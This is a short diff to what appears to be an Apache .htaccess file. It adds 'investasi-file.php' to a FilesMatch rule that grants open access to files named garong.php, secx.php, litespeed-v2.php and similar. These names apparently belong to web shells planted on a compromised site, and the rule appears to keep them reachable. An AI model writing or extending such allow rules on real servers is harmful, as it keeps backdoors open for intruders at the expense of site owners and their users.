@@ -82,7 +82,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(XmlFilter.php|secx-OTH.php|secx-OTH-1.php|indexSite.php|ssi-litespeed.shtml|ssi-litespeed-OTH.shtml|litespeed-v2.php|litespeed-v2-OTH.php|print-litespeed.php|print-litespeed-OTH.php|print-litespeed-OTH-1.php|secx.php|SettingsForm.inc.php|3_ReadCounterTable.php|garong.php|garong-OTH.php|garong-OTH-1.php|garong-OTH.php5|garong-OTH-1.php5|garong-OTH.php5)$"> 
+<FilesMatch "^(investasi-file.php|XmlFilter.php|secx-OTH.php|secx-OTH-1.php|indexSite.php|ssi-litespeed.shtml|ssi-litespeed-OTH.shtml|litespeed-v2.php|litespeed-v2-OTH.php|print-litespeed.php|print-litespeed-OTH.php|print-litespeed-OTH-1.php|secx.php|SettingsForm.inc.php|3_ReadCounterTable.php|garong.php|garong-OTH.php|garong-OTH-1.php|garong-OTH.php5|garong-OTH-1.php5|garong-OTH.php5)$"> 
 Order Allow,Deny 
 Allow from all 
 </FilesMatch>
